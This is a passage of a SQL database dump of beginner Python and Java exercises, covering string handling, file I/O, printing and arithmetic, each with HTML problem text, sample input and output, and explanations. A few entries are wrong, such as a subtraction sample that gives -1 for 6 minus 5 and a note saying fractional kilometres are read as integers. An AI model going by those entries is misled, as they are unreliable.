style=\"line-height: 1;\">python program to get a String and a character then count the occurrence of character in the string.</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">Hello\r\no\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n1</p>','B','','prog/python/countchar.py','Visit each location in string s one by one \r\nfor i in range(0,len(s)):\r\n\r\nif character c is found, increase the count by 1',19,NULL,NULL,NULL),(968,'lowercase to uppercase in python','lowercase-to-uppercase-in-python','<p style=\"line-height: 1;\">python program to get a String and convert the lower case characters to upper case Characters</p><p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">Hello </p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nHELLO</p>','B','','prog/python/lowertouppercase.py','<p style=\"line-height: 1;\">unicode / ascii_val of lower case alphabets are from 97 to 122\r\nunicode / ascii_val of upper case alphabets are from 65 to 90\r\nso the difference between lower case and uppercase alphabets is 32.\r\n</p><p style=\"line-height: 1;\">\r\nuse ord() method to find ascii_val of a character.</p><p style=\"line-height: 1;\">\r\n\r\nUse chr() method to find character of ascii value\r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.</p>',19,NULL,NULL,NULL),(969,'uppercase to lowercase in python','uppercase-to-lowercase-in-python','<p style=\"line-height: 1;\">python program to get a String and convert the upper case characters tolower case Characters</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">Hello</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nhello</p>','B','','prog/python/uppertolowercase.py','<p style=\"line-height: 1;\">unicode / ascii_val of lower case alphabets are from 97 to 122\r\nunicode / ascii_val of upper case alphabets are from 65 to 90\r\nso the difference between lower case and uppercase alphabets is 32.</p><p style=\"line-height: 1;\">\r\n\r\nuse ord() method to find ascii_val of a character.</p><p style=\"line-height: 1;\">\r\n\r\nUse chr() method to find character of ascii value\r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.</p>',19,NULL,NULL,NULL),(970,'python count vowels in string','python-count-vowels-in-string','<p style=\"line-height: 1;\">python program to get a String and count the number of vowels occurred in string.</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">Hello</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">2</p>','B','','prog/python/vowelscount.py','visit  each location in string s, if the character in the location is a vowel then increment vowels by 1.',19,NULL,NULL,NULL),(971,'Compare  two Strings in python','Compare-two-Strings-in-python','<p style=\"line-height: 1;\">python program to get two strings and check whether both are equal\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">MARK\r\nMAKE</p><p style=\"line-height: 1;\"> Sample&nbsp;Output 1 :</p><p style=\"line-height: 1;\">\r\nNot Equal</p>','B','','prog/python/stringcomparre.py','<p style=\"line-height: 1;\">if the length of two strings are not equal then strings are not equal else,\r\nvisit each location of in strings and compare the characters in s1 and s2.</p><p style=\"line-height: 1;\">\r\n\r\nif all the characters are s1 and s2 are equal then the strings are equal else not equal.</p>',19,NULL,NULL,NULL),(972,'find vowels in string python','find-vowels-in-string-python','<p style=\"line-height: 1;\">python program to get two strings and print the vowels in string.</p><p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\nMAKE </p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nA E</p>','B','','prog/python/vowelsprint.py','visit  each location in string s, if the character in the location is a vowel then print the character.',19,NULL,NULL,NULL),(973,'find substring in string pyhton','find-substring-in-string-pyhton','<p style=\"line-height: 1;\">python program to get a String and Substring and find where the substring is present in String.</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">entertainment\r\nain</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/python/substring.py','<p style=\"line-height: 1;\">check whether first character of sub string is equal to any character in string. </p><p style=\"line-height: 1;\">If it is equal, then check remaining characters are equal to the characters in substring.</p><p style=\"line-height: 1;\">  else move to next character.</p>',19,NULL,NULL,NULL),(974,'occurences of substring in a String python','occurences-of-substring-in-a-String-python','<p style=\"line-height: 1;\">python program to get a String and Substring and count the occurrence of substring in string.</p><p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\nentertainment\r\nen </p><p style=\"line-height: 1;\">Sample&nbsp;&nbsp;Output 1 :</p><p style=\"line-height: 1;\">\r\n2</p>','B','','prog/python/countsubstring.py','<p style=\"line-height: 1;\">check whether first character of sub string is equal to any character in string. </p><p style=\"line-height: 1;\">If it is equal, then check remaining characters are equal to the characters in substring.</p><p style=\"line-height: 1;\">else move to next character.</p>',19,NULL,NULL,NULL),(975,'Reverse the String in python','Reverse-the-String-in-python','<p style=\"line-height: 1;\">python program to get a String and reverse the characters of the string</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nHello </p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nolleH</p>','B','','prog/python/reversestring.py','visit each location in string s1 from the  last location len(l)-1 and append it to s2, finally store s2 in s1\r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.',19,NULL,NULL,NULL),(976,'string Palindronme in python','string-Palindronme-in-python','<p style=\"line-height: 1;\">python program to get a String and reverse the characters of the string. And check whether reverse order and original order is same.</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">madam </p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nPalindronme</p>','B','','prog/python/palindronmestring.py','<p style=\"line-height: 1;\">visit each location in string s1 from the  last location len(l)-1 and append it to s2.\r\n\r\nif s1 is equal to s2 then it is palindronme else it is not palindronme.</p><p style=\"line-height: 1;\">\r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.</p>',19,NULL,NULL,NULL),(977,'Remove the spaces in String python','Remove-the-spaces-in-String-python','<p style=\"line-height: 1;\">python program to get a String and remove the spaces </p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> Hello World <br>Sample&nbsp;&nbsp;Output 1 :\r\n</p><p style=\"line-height: 1;\">HelloWorld</p>','B','','prog/python/removespace.py','visit each location in string s1, if charcter in the location is not  a space then append it in s2, finally store s2 in s1. \r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.',19,NULL,NULL,NULL),(978,'Remove the Vowels in String Python','Remove-the-Vowels-in-String-Python','<p style=\"line-height: 1;\">python program to get a String and remove the vowels</p><p style=\"line-height: 1;\"> Sample Input 1 :</p><p style=\"line-height: 1;\"> Hello World </p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\nHll Wrld</p>','B','','prog/python/removevowels.py','visit each location in string s1, if charcter in the location is not a vowel then append it in s2, finally store s2 in s1. \r\nNote:\r\nString is immutable, so you cannot modify a character directly in a orginal string.',19,NULL,NULL,NULL),(979,'File read in python','File-read-in-python','Python Program to read the contents of sample.txt file and display it.','B','','prog/python/fileread.py','open the file in read mode\r\nread all the contents of file using read() method\r\nclose() the file.',20,NULL,NULL,NULL),(980,'File Write in python','File-Write-in-python','Python Program to Earse the content of file sample.txt and write something new.','B',NULL,'prog/python/filewrite.py','open the file in write mode\nwrite the content into the file using write() method \nclose() the file.',20,NULL,NULL,NULL),(981,'append file in python','append-file-in-python','Python Program to write something new into file sample.txt without earsing the exisiting content.','B',NULL,'prog/python/fileappend.py','open the file in append mode\nwrite the content into the file using write() method \nclose() the file.',20,NULL,NULL,NULL),(982,'File copy in python','File-copy-in-python','Python Program to Copy the contents of one file to another file','B','','prog/python/filecopy.py','<p style=\"line-height: 1;\">open the source file file1 in read mode\r\nopen the destination file file2 in write mode\r\nread the contents of file1 and store it in variable content.\r\n</p><p style=\"line-height: 1;\">Write content into file2, then close both the files file1 and file2.</p>',20,NULL,NULL,NULL),(983,'Read all files in the Directory python','Read-all-files-in-the-Directory-python','Python Program to read the contents of all the files located in the directory','B','','prog/python/allfile.py','<p style=\"line-height: 1;\">Collect the files in the directory using listdir() method.\r\n</p><p style=\"line-height: 1;\">Using \"for\" open each file in read mode and read the content of file and close the file.</p>',20,NULL,NULL,NULL),(984,'Read file line by line in python','Read-file-line-by-line-in-python','Python program to read a file line by line','B','','prog/python/filereadline.py','<p style=\"line-height: 1;\">open the file in read mode\r\nread line by line using readline() method.\r\n</p><p style=\"line-height: 1;\">Read a line and check whether there is content in the line, then print it and read the next line.</p><p style=\"line-height: 1;\"> Repeat it until a line has no content.\r\n</p><p style=\"line-height: 1;\">close() the file.</p>',20,NULL,NULL,NULL),(985,'Java Program to Print Welcome','Java-Program-to-Print-Welcome','<p style=\"line-height: 1;\">Program should simply display \"Welcome\".\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nWelcome</p>','B','','prog/java/Welcome.java','<span style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">The Literal \"Welcome \" is printed in the console using println() function which is the part of System.out package.</span>',21,'output/welcome.png','',''),(986,'Java Program to Print the given Message','Java-Program-to-Print-the-given-Message','<p style=\"line-height: 1;\">Get a Message from user and display the same.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nhello world\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nhello world</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\nhi boss</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nhi boss</p>','B','','prog/java/Message.java','<p><span class=\" jss388 jss389\" style=\"box-sizing: inherit; color: rgb(37, 37, 37); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 16px;\">Th</span>e Scanner class, which is part of the <i>java.util</i> package, is used to get user input. To use the Scanner class, create an object of the class and call any of the methods listed in the documentation for the Scanner class. The <i>nextLine()</i> method, which is used to read Strings, are used in our example.</p><p>The Input is stored in the variable Input and printed in console using <i>println()</i> function which is the part of <i>System.out</i> package.</p><p><span class=\" jss388 jss414\" style=\"box-sizing: inherit;\"><span id=\"editable-content-within-article~0~10~1\" class=\"jss390 jss416\" style=\"box-sizing: inherit; cursor: pointer; border-bottom: 2px solid rgb(255, 221, 46);\"><br></span></span></p>',21,'output/Message.png','',''),(987,'Java Program to Print the given word','Java-Program-to-Print-the-given-word','<p style=\"line-height: 1;\">Get a Word from user and display the same.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nhello</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nhello</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">hi boss\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nhi</p>','B','','prog/java/Word.java','<p style=\"line-height: 1;\">The java.util.Scanner.next() method finds and returns the scanner\'s next complete token. So it just takes the word. next() do not consider the characters after the spaces. Try with the Input \"Hello World\", you will get \"Hello\".<br></p>',21,'output/word.png','',''),(988,'Java Program to print the given integer number','Java-Program-to-print-the-given-integer-number','<p style=\"line-height: 1;\">Get a number from user and display the same\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56</p>','B','','prog/java/Integer.java','<p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><span class=\" jss388 jss389\" style=\"box-sizing: inherit; color: rgb(37, 37, 37); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 16px;\">Th</span>e Scanner class, which is part of the <i>java.util</i> package, is used to get user input. To use the Scanner class, create an object of the class and call any of the methods listed in the documentation for the Scanner class. The<i>&nbsp;<span style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; float: none; display: inline !important;\">nextInt</span>()</i> method, which is used to read Integers, are used in our example.</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">The Input is stored in the variable Input1 and printed in console using println() function which is the part of <i>System.out</i> package.</p>',21,'','',''),(989,'Java Program to print the given  fractional number','Java-Program-to-print-the-given-fractional-number','<p style=\"line-height: 1;\">Get a fractional number from user and display the same\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n56.3426</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56.3426</p>','B','','prog/java/Fractional.java','<p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><span class=\" jss388 jss389\" style=\"box-sizing: inherit; color: rgb(37, 37, 37); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 16px;\">Th</span>e Scanner class, which is part of the&nbsp;<i>java.util</i>&nbsp;package, is used to get user input. To use the Scanner class, create an object of the class and call any of the methods listed in the documentation for the Scanner class. The<i>&nbsp;nextFloat()</i>&nbsp;method, which is used to read Fractional Numbers, are used in our example.</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">The Input is stored in the variable Input1 and printed in console using println() function which is the part of&nbsp;<i>System.out</i>&nbsp;package.</p>',21,'','',''),(990,'Java Program to print the given fractional number in 2 digit decimal format','Java-Program-to-print-the-given-fractional-number-in-2-digit-decimal-format','<p style=\"line-height: 1;\">Get a fractional number from user and display the same in two digit precision\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n56.3426</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56.34</p>','B','','prog/java/FraTd.java','<div class=\"entity_content\" style=\"margin-top: 20px; margin-bottom: 20px; text-align: justify; color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px;\"><p><span class=\" jss388 jss389\" style=\"box-sizing: inherit; color: rgb(37, 37, 37); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 16px;\">Th</span>e Scanner class, which is part of the&nbsp;<i>java.util</i>&nbsp;package, is used to get user input. To use the Scanner class, create an object of the class and call any of the methods listed in the documentation for the Scanner class. The<i>&nbsp;nextFloat()</i>&nbsp;method, which is used to read Fractional Numbers, are used in our example.</p><p>The Input is stored in the variable Input1 and printed in console using println() function which is the part of&nbsp;<i>System.out</i>&nbsp;package.</p><p><span style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px;\"><span style=\"font-size: 18px; font-family: &quot;Comic Sans MS&quot;;\">Format Specifier </span><i style=\"\"><span style=\"font-size: 18px; font-family: &quot;Comic Sans MS&quot;;\">\"%.2f\"</span></i><span style=\"font-size: 18px; font-family: &quot;Comic Sans MS&quot;;\"> prints value as Floating Point Number with 2digit Precision(.00).</span></span><br></p></div>',21,'','',''),(991,'Java Program to print the ASCII value of a character','Java-Program-to-print-the-ASCII-value-of-a-character','<p style=\"line-height: 1;\">Get a character from user and display the corresponding ASCII value\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nA\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n65\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\nJ</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">74</p>','B','','prog/java/Ascii.java','<p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><span class=\" jss388 jss389\" style=\"box-sizing: inherit; color: rgb(37, 37, 37); font-family: &quot;Open Sans&quot;, sans-serif; font-size: 16px;\">Th</span>e Scanner class, which is part of the&nbsp;<i>java.util</i>&nbsp;package, is used to get user input. To use the Scanner class, create an object of the class and call any of the methods listed in the documentation for the Scanner class. The<i>&nbsp;next()</i>&nbsp;method, which is used to read character, are used in our example.</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><i>charat(0) returns first character, if user enters multiple character.&nbsp;</i></p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\">The Input character&nbsp; is stored in the variable ch and converted as integer using (int) which returns the ASCII value of the characters.&nbsp;</p><p style=\"color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px; text-align: justify;\"><br></p><div><br></div>',21,'','',''),(992,'Java Program to print two numbers with a space between them','Java-Program-to-print-two-numbers-with-a-space-between-them','<p style=\"line-height: 1;\">Get two integer numbers, display them with single space</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n65 4\r\n</p>','B','','prog/java/Space.java','<p style=\"line-height: 1;\"><br></p>',21,'','',''),(993,'Java Program to print two numbers with a tab space between them','Java-Program-to-print-two-numbers-with-a-tab-space-between-them','<p style=\"line-height: 1;\">Get two integer numbers, display them with tab space</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5                      6</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n65                    4\r\n</p>','B','','prog/java/Tab.java','<p style=\"line-height: 1;\">\"\\t\" format specifier is used in println() function to leave tab space in the console.</p>',21,'','',''),(994,'Java Program to print two numbers in two lines','Java-Program-to-print-two-numbers-in-two-lines','<p style=\"line-height: 1;\">Get two integer numbers, display them in two lines\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 </p><p style=\"line-height: 1;\">\r\n6</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n65\r\n</p><p style=\"line-height: 1;\">4</p>','B','','prog/java/Line.java','<p style=\"line-height: 1;\"><span style=\"font-size: 18px;\">\"\\n\" format specifier is used in </span><i><span style=\"font-size: 18px;\">println()</span></i><span style=\"font-size: 18px;\"> function to move to new line.</span></p>',21,'','',''),(995,'Java Program to Addition of two numbers','Java-Program-to-Addition-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, add both the integers and display the sum.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n11</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">69\r\n</p>','B','','prog/java/Addition.java','Get two integers Input1 and Input2 (using scanner class)\r\n\r\nAdd Input1 and Input2, then store the sum  (sum=Input1+Input2)\r\n\r\nprint the value of sum (using system.out.println)',22,'','raptor/addition.PNG',''),(996,'Java Program to subtraction of two numbers','Java-Program-to-subtraction-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, subtract both the integers and display the difference</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n-1</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n61\r\n</p>','B','','prog/java/Subtraction.java','Get two integers Input1 and Input2  (using scanner class)\r\n\r\nSubract Input2 from Input1, then store the difference in sub (sub= Input1-Input2)\r\n\r\nprint the value of sub (using system.out.println)',22,'','raptor/difference_vWUmnAc.PNG',''),(997,'Java Program to multiply two numbers','Java-Program-to-multiply-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, multiply both the integers and display the product.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n30</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">65 10</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">650\r\n</p>','B','','prog/java/Multiplication.java','Get two integers Input1 and Input2 (using scanner class)\r\n\r\nmultiply Input1 and Input1, then store the product in mul (mul=Input1*Input2)\r\n\r\nprint the value of mul (using system.out.println)',22,NULL,NULL,NULL),(998,'Java Program to divide two numbers','Java-Program-to-divide-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, divide both the integers and display the quotient.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n6 5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n1</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n28 4</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n7\r\n</p>','B','','prog/java/Division.java','Get two integers Input1 and Input2 (using scanner class)\r\n\r\nDivide Input1 by Input2, then store quotient in div (div=Input1/Input2, Note \"/\" operator gives quotient)\r\n\r\nPrint the value of div (using system.out.println)',22,'','raptor/divide_two_numbers.PNG',''),(999,'Java Program to find modulus of two numbers','Java-Program-to-find-modulus-of-two-numbers','<p style=\"line-height: 1;\">Get two integer numbers, divide both the integers and display&nbsp; the remainder.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">28 4</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">0\r\n</p>','B','','prog/java/Modulus.java','Get two integers Input1 and Input2 (using scanner class)\r\n\r\ndivide Input1 by Input2 , then store remainder in mod (mod=Input1%Input2 , Note \"%\" operator gives remainder)\r\n\r\nprint the value of mod (using system.out.println)',22,'','',''),(1000,'Java Program to Kilo Meters to Meters','Java-Program-to-Kilo-Meters-to-Meters','<p style=\"line-height: 1;\">Get Kilometer km from user and find meter m</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56000\r\n\r\n</p>','B','','prog/java/KmToMts.java','<p style=\"line-height: 1;\">Get kilometer km as input (using scanner class)  (since kilometer may be in fractional values like 1 and 5, it is declared &amp; read as integer.) </p><p style=\"line-height: 1;\">\r\n\r\nCalculate meter m by multiplying kilometer km with 1000. </p><p style=\"line-height: 1;\">(m=km*1000, 1000 meter is equal to 1 kilometer)\r\n\r\nprint meter m. (using system.out.println)</p>',22,NULL,NULL,NULL),(1001,'Java Program to Meters to Kilo Meters','Java-Program-to-Meters-to-Kilo-Meters','<p style=\"line-height: 1;\">Get meter m from user and find kilometer km\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n56000</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56\r\n\r\n</p>','B','','prog/java/MtsToKm.java','<p style=\"line-height: 1;\">\r\nGet meter mts as input  (using scanner class)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate kilometer km by dividing meter  mts by 1000. </p><p style=\"line-height: 1;\">(km=mts/1000, 1000 meter is equal to 1 kilometer)</p>',22,'','raptor/kilometer_to_meter.PNG',''),(1002,'Java Program to find area of Square','Java-Program-to-find-area-of-Square','<p style=\"line-height: 1;\">Get side of square and find area of square\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n16\r\n\r\n</p>','B','','prog/java/Square.java','Get side of a square (using scanner class)\r\n\r\nCalculate area by multiplying side and side(area = side * side)\r\n\r\nprint area(using System.out.println())',22,NULL,NULL,NULL),(1003,'Java Program to find area of Rectangle','Java-Program-to-find-area-of-Rectangle','<p style=\"line-height: 1;\">Get length and breadth of rectangle and find area of rectangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4 5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n20\r\n\r\n</p>','B','','prog/java/Rectangle.java','Get length and breadth of a rectangle (using scanner class)\r\n\r\nCalculate area by multiplying length and breadth (area = length * breadth)\r\n\r\nprint area (using system.out.println)',22,NULL,NULL,NULL),(1004,'Java Program to find area of Right-angled triangle','Java-Program-to-find-area-of-Right-angled-triangle','<p style=\"line-height: 1;\">Get length and width of right angled triangle and find area of right angled triangle</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4 5</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n10\r\n\r\n</p>','B','','prog/java/RightATri.java','Get length and breadth of a right angled triangle (using scanner class)\r\n\r\nCalculate area by dividing product of length and breadth by 2  (area = length * breadth/2)\r\n\r\nprint area (using system.out.println)',22,'','raptor/area_of_right_angle_triangle.PNG',''),(1005,'Java Program to find area of triangle','Java-Program-to-find-area-of-triangle','<p style=\"line-height: 1;\">Get base width and height of triangle and find area of triangle\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p>','B','','prog/java/Triangle.java','Get height and base of a  triangle (using scanner class)\r\n\r\nCalculate area by multiplying product of height and base by 0.5  (area = base * height*0.5)\r\n\r\nprint area (using system.out.println)',22,'','raptor/area_of_triangle.PNG',''),(1006,'Java Program to find area of Circle (Use Constant)','Java-Program-to-find-area-of-Circle-Use-Constant','<p style=\"line-height: 1;\">Get radius of circle and find area of circle.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n50.24\r\n</p>','B','','prog/java/Circle.java','Get radius of a circle (using scanner class)\r\n\r\nCalculate area by  multiplying pi and radius and radius (area =pi*radius*radius)\r\n (pi is  3.14 , global constant)\r\n\r\nPrint area (using system.out.println)',22,'','raptor/Area_of_circle_nY9vumI.PNG',''),(1007,'Java Program to find the distance between two points in 2D space','Java-Program-to-find-the-distance-between-two-points-in-2D-space','<p style=\"line-height: 1;\">Get x and y coordinates of two points(x1,y1,x2,y2) and find distance between two points</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n3 4\r\n4 5</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1.414\r\n\r\n</p>','B','','prog/java/Distance.java','Get x1,y1,x2 and y2 coordinates of two points(using scanner class)\r\n\r\nCalculate distance by the eculdian distance formula. Math.sqrt is function available in java library to find square root.\r\n\r\nPrint distance (using system.out.println).',22,'','raptor/distance_in_2d.PNG',''),(1008,'Java Program to calculate kilobytes to bytes','Java-Program-to-calculate-kilobytes-to-bytes','<p style=\"line-height: 1;\">Get kilobytes kb from user and find bytes b\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">2</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2048</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">1</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">1024\r\n</p>','B','','prog/java/KiloToBytes.java','Get kilobytes Kilo as input (using scanner class) \r\n\r\nCalculate bytes Byt by multipllying kilobytes  with 1024. (Byt=Kilobyte*1024, 1024 byts is equal to 1 kilobyte)\r\n\r\nPrint bytes Byt (using system.out.println)',22,'','raptor/kilo_bytes_to_bytes_Zj2NM5N.PNG',''),(1009,'Java Program to calculate bytes to kilobytes','Java-Program-to-calculate-bytes-to-kilobytes','<p style=\"line-height: 1;\">Get bytes b from user and  find kilobytes kb\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n2048</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n2</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">1024</p><p style=\"line-height: 1;\">Sample Output 